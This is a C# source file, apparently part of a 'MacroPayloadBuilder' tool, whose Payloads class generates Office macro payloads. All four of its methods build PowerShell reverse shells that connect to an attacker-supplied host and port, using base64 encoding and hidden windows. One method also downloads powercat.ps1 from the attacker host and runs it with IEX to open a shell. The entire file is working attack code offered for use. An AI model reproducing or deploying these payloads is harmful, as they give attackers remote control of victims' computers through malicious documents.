using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace MacroPayloadBuilder
{
    internal class Payloads
    {
        Macro macro = new Macro();

        public void powershellEncoded(string lhost, string lport)
        {
            string payload = "$client = New-Object System.Net.Sockets.TCPClient(\"" + lhost + "\"," + lport + ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()";
            string encodedPayload = Convert.ToBase64String(Encoding.Unicode.GetBytes(payload));
            string fullCommand = "powershell -w hidden -e " + encodedPayload;
            macro.generateMacro(fullCommand);
        }

        public void powershellCMDEncoded(string lhost, string lport)
        {
            string payload = "$client = New-Object System.Net.Sockets.TCPClient(\"" + lhost + "\"," + lport + ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()";
            string encodedPayload = Convert.ToBase64String(Encoding.Unicode.GetBytes(payload));
            string fullCommand = "cmd.exe /C powershell -nop -w hidden -e " + encodedPayload;
            macro.generateMacro(fullCommand);
        }

        public void powerShellStandard(string lhost, string lport)
        {
            string payload = "powershell -nop -w hidden -c \"\"$client = New-Object System.Net.Sockets.TCPClient('" + lhost + "'," + lport + ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"";
            macro.generateMacro(payload);
        }

        public void encodedPowerCat(string lhost, string lport)
        {
            string payload = "IEX(New-Object System.Net.WebClient).DownloadString('http://" + lhost + "/powercat.ps1');powercat -c " + lhost + " -p " + lport + " -e powershell";
            string encodedPayload = Convert.ToBase64String(Encoding.Unicode.GetBytes(payload));
            string fullCommand = "powershell.exe -nop -w hidden -e " + encodedPayload;
            macro.generateMacro(fullCommand);
        }





    }
}